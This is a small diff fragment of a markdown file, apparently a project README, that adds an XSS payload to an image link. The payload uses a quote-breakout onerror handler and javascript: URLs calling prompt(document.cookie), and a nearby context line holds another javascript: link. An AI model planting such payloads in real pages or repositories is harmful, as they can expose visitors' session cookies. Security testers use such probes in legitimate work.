@@ -80,7 +80,7 @@ Best Practices: https://docs.aws.amazon.com/codestar/latest/userguide/best-pract
 
 
 
-![a](javascript:prompt(document.cookie))\
+![a'"`onerror=prompt(document.cookie](javascript:prompt(document.cookie))\
 
 
 [a](javascript:prompt(document.cookie))
